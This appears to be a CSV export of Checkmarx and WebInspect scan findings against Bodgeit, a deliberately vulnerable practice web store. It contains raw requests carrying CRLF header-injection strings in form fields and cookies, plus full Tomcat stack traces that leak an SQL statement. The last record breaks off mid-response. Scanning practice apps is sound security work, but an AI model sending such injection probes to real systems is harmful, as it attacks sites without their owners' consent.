"DemoApps","","Bodgeit","310","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","649","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/score.jsp","","","http://localhost/bodgeit/root/score.jsp","","","","","","","",""
"DemoApps","","Bodgeit","349","Download_of_Code_Without_Integrity_Check","","Medium","Open","2015-10-15","Checkmarx","494","Download of Code Without Integrity Check","","/bodgeit/root/search.jsp","","","http://localhost/bodgeit/root/search.jsp","","","","","","","",""
"DemoApps","","Bodgeit","27","Poor Error Handling: Server Error Message","","Medium","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/advanced.jsp","","","http://localhost:8080/bodgeit/advanced.jsp","","POST /bodgeit/advanced.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/advanced.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 54 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""72C74AA2FFBF7903A621A1E0D414C8D9""; PSID=""3FCED1E456DB34600C5D54DA71EE2BF9""; SessionType=""Crawl""; CrawlType=""Form""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""action""; Format=""Relative""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""139""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""2552532f-0a0c-4874-9d77-e44f56a540b2""; X-Request-Memo: ID=""4e906b45-8775-41d8-8aea-7bcd42ab5fe0""; sc=""1""; ThreadId=""59""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01;b_id=3 product=12345&description=12345&type=12345&price=12345","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 1787 Date: Thu, 15 Oct 2015 19:11:14 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NullPointerException</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NullPointerException</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NullPointerException org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NullPointerException </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","36","Poor Error Handling: Unhandled Exception","","Medium","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/advanced.jsp","q","","http://localhost:8080/bodgeit/advanced.jsp","","POST /bodgeit/advanced.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/advanced.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 29 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""702DC23FA2F9549D5195EEE8FB4BBBDD""; PSID=""7F626319A3D7A788E15CAA3E01DE7C18""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""90e84d4b-fe51-47a6-ace4-be01fbb9325c""; AttackSequence=""0""; AttackParamDesc=""q""; AttackParamIndex=""0""; AttackParamSubIndex=""0""; CheckId=""3582""; Engine=""Http+Response+Splitting""; SmartMode=""NonServerSpecificOnly""; AttackString=""%250d%250aSPIHeader%3a%2520SPIValue""; AttackStringProps=""Attack""; ThreadId=""37""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""39""; smi=""0""; sc=""1""; ID=""13bab66c-8d98-4703-afc9-9640c0f2d87d""; X-Request-Memo: ID=""aa984ee2-403e-47b0-96f7-b542674feccd""; sc=""1""; ThreadId=""61""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=8AAC5A527778FC2B9C5FC94740B8E238 q=%0d%0aSPIHeader:%20SPIValue","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2710 Date: Thu, 15 Oct 2015 19:15:02 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot; &quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot; &quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:569) com.thebodgeitstore.util.AES.hexStringToByteArray(Unknown Source) com.thebodgeitstore.util.AES.decryptCrt(Unknown Source) org.apache.jsp.advanced_jsp._jspService(advanced_jsp.java:145) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","22","Poor Error Handling: Unhandled Exception","","Medium","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/basket.jsp","b_id","","http://localhost:8080/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 49 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""5ABA7F097604F6ABB25C6D86817629D6""; PSID=""2F08C26924C0F48A1DBFF17176C6A53E""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""CookieParamManipulation""; OriginatingEngineID=""90e84d4b-fe51-47a6-ace4-be01fbb9325c""; AttackSequence=""0""; AttackParamDesc=""b_id""; AttackParamIndex=""2""; AttackParamSubIndex=""0""; CheckId=""3582""; Engine=""Http+Response+Splitting""; SmartMode=""NonServerSpecificOnly""; AttackString=""3%250d%250aSPIHeader%3a%2520SPIValue""; AttackStringProps=""Attack""; ThreadId=""32""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""43""; smi=""0""; sc=""1""; ID=""1f03bc0f-46d4-4177-982a-33f9a8688eb8""; X-Request-Memo: ID=""2f70a819-22ac-4b76-975b-f4ea204e0751""; sc=""1""; ThreadId=""63""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=42DFBC0C0E7A142BFC617DE68702DEEC;b_id=3%0d%0aSPIHeader:%20SPIValue quantity_7=1&quantity_26=1&update=Update%20Basket","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 4016 Date: Thu, 15 Oct 2015 19:14:09 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - javax.servlet.ServletException: java.sql.SQLException: Unexpected token: % in statement [UPDATE BasketContents SET quantity = 1 WHERE basketid=3%0d%0aSPIHeader AND productid = 7]</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>javax.servlet.ServletException: java.sql.SQLException: Unexpected token: % in statement [UPDATE BasketContents SET quantity = 1 WHERE basketid=3%0d%0aSPIHeader AND productid = 7]</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: javax.servlet.ServletException: java.sql.SQLException: Unexpected token: % in statement [UPDATE BasketContents SET quantity = 1 WHERE basketid=3%0d%0aSPIHeader AND productid = 7] org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:462) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>javax.servlet.ServletException: java.sql.SQLException: Unexpected token: % in statement [UPDATE BasketContents SET quantity = 1 WHERE basketid=3%0d%0aSPIHeader AND productid = 7] org.apache.jasper.runtime.PageContextImpl.doHandlePageException(PageContextImpl.java:916) org.apache.jasper.runtime.PageContextImpl.handlePageException(PageContextImpl.java:845) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:410) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.sql.SQLException: Unexpected token: % in statement [UPDATE BasketContents SET quantity = 1 WHERE basketid=3%0d%0aSPIHeader AND productid = 7] org.hsqldb.jdbc.Util.throwError(Unknown Source) org.hsqldb.jdbc.jdbcPreparedStatement.&lt;init&gt;(Unknown Source) org.hsqldb.jdbc.jdbcConnection.prepareStatement(Unknown Source) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","2","Poor Error Handling: Unhandled Exception","","Medium","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/basket.jsp","price","","http://localhost:8080/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/product.jsp?prodid=7 Content-Type: application/x-www-form-urlencoded Content-Length: 35 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""A23E52C5B952F3522C78F754FA689A20""; PSID=""F2239B8A3CEC359684886107925BCABC""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""18264a0f-d83e-4ef5-a73d-1f06044c9fde""; AttackSequence=""0""; AttackParamDesc=""price""; AttackParamIndex=""1""; AttackParamSubIndex=""0""; CheckId=""2148""; Engine=""Post+Injection""; SmartMode=""NonServerSpecificOnly""; AttackString=""%250aA%3aB""; AttackStringProps=""Attack""; ThreadId=""35""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""43""; smi=""0""; sc=""1""; ID=""afe97734-6a59-4367-8f10-be35b038e8ea""; X-Request-Memo: ID=""283a87bc-3144-431c-b840-07226c7bf94a""; sc=""1""; ThreadId=""63""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=42DFBC0C0E7A142BFC617DE68702DEEC;b_id=11 productid=7&price=%0aA:B&quantity=1","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2680 Date: Thu, 15 Oct 2015 19:13:46 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;11111111111&quot;</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;11111111111&quot;</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;11111111111&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;11111111111&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:583) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:277) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","1","Poor Error Handling: Unhandled Exception","","Medium","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/basket.jsp","quantity","","http://localhost:8080/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/product.jsp?prodid=7 Content-Type: application/x-www-form-urlencoded Content-Length: 59 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""813F043EB601621DEEE3A6F77B2BC6A2""; PSID=""F2239B8A3CEC359684886107925BCABC""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""90e84d4b-fe51-47a6-ace4-be01fbb9325c""; AttackSequence=""0""; AttackParamDesc=""quantity""; AttackParamIndex=""2""; AttackParamSubIndex=""0""; CheckId=""3582""; Engine=""Http+Response+Splitting""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%250d%250aSPIHeader%3a%2520SPIValue""; AttackStringProps=""Attack""; ThreadId=""35""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""49""; smi=""0""; sc=""1""; ID=""563b0b00-153d-45df-a7ac-92bf2441ad41""; X-Request-Memo: ID=""5246fcc8-23fa-430d-8c12-9e8f644c7f07""; sc=""1""; ThreadId=""66""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=95425C707A42EAA4BE0BC4F23058CD56;b_id=9 productid=7&price=3.5&quantity=1%0d%0aSPIHeader:%20SPIValue","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2674 Date: Thu, 15 Oct 2015 19:13:26 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue11&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue11&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:277) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","8","Poor Error Handling: Unhandled Exception","","Medium","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/basket.jsp","quantity_12","","http://localhost:8080/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 121 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""555822380BBB5DF21B47FA65CE98425A""; PSID=""AEB77DB9767A0403D3B9B98F348DFFAA""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""90e84d4b-fe51-47a6-ace4-be01fbb9325c""; AttackSequence=""0""; AttackParamDesc=""quantity_12""; AttackParamIndex=""4""; AttackParamSubIndex=""0""; CheckId=""3582""; Engine=""Http+Response+Splitting""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%250d%250aSPIHeader%3a%2520SPIValue""; AttackStringProps=""Attack""; ThreadId=""33""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""55""; smi=""0""; sc=""1""; ID=""273d1685-7a70-49fa-aeef-6d2d36aa8466""; X-Request-Memo: ID=""79f0feca-2801-4e68-87e4-f7db8d67fc5e""; sc=""1""; ThreadId=""69""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=37347B65FE07002A330BD1BEC7305050;b_id=7 quantity_7=1&quantity_26=211&quantity_18=11&quantity_20=1&quantity_12=1%0d%0aSPIHeader:%20SPIValue&update=Update%20Basket","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2670 Date: Thu, 15 Oct 2015 19:14:37 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","42","Poor Error Handling: Unhandled Exception","","Medium","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/basket.jsp","quantity_18","","http://localhost:8080/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 94 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""71FB122150480982FCFE75570C88CFF2""; PSID=""7FD4B7EF6E1659D85B8F4BD4DF413821""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""90e84d4b-fe51-47a6-ace4-be01fbb9325c""; AttackSequence=""0""; AttackParamDesc=""quantity_18""; AttackParamIndex=""2""; AttackParamSubIndex=""0""; CheckId=""3582""; Engine=""Http+Response+Splitting""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%250d%250aSPIHeader%3a%2520SPIValue""; AttackStringProps=""Attack""; ThreadId=""36""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""53""; smi=""0""; sc=""1""; ID=""0bddb808-f5fc-47c2-a667-5b2913481a24""; X-Request-Memo: ID=""fc20df4b-22dd-454e-96d7-9ad09ac2b5af""; sc=""1""; ThreadId=""68""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=A92787F126D728E17AB078AA8A9CA54C;b_id=8 quantity_7=211&quantity_26=211&quantity_18=1%0d%0aSPIHeader:%20SPIValue&update=Update%20Basket","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2670 Date: Thu, 15 Oct 2015 19:14:20 GMT Connection: close <html><head><title>Apache 